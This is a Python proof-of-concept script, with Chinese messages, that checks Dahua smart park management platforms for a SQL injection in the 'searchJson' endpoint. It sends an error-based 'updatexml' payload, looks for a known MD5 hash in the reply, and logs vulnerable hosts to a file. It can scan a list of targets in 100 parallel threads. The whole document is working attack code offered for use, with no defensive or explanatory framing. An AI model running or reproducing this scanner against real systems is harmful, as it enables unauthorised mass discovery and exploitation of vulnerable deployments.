import requests,sys,re,argparse,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test="""
 ____  _____ ____  ____  ____  _        _  ____  ____  _        ____  ____  _    
/ ___\/  __//  _ \/  __\/   _\/ \ /|   / |/ ___\/  _ \/ \  /|  / ___\/  _ \/ \   
|    \|  \  | / \||  \/||  /  | |_||   | ||    \| / \|| |\ ||  |    \| / \|| |   
\___ ||  /_ | |-|||    /|  \_ | | ||/\_| |\___ || \_/|| | \||  \___ || \_\|| |_/\
\____/\____\\_/ \|\_/\_\\____/\_/ \|\____/\____/\____/\_/  \|  \____/\____\\____/
                                                                                 
"""

    print(test)



def main():
    banner()
    parser=argparse.ArgumentParser(description='大华智慧园区综合管理平台 searchJson SQL注入漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='input the url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input the file')
    args=parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8')as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp=Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")



def poc(target):
    url_payload= '/portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20md5(388609)),0x7e),1)--%22%7D/extend/%7B%7D '
    headers={
        'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
        'Accept-Encoding':'gzip, deflate'
    }

    try:
        res1=requests.get(url=target+url_payload,headers=headers,timeout=10)
        if '1E469DBCB9211897B5F5EBF866C66F3D' in res1.text:
            print( f"[+]{target} 存在漏洞！")
            with open('result.txt','a',encoding='utf-8')as fp:
                fp.write(target+'\n')
                return True
        else:
            print('[-] 不存在漏洞')
            return False
    except:
        print('目标网站存在问题，无法访问')



if __name__ =='__main__':
    main()
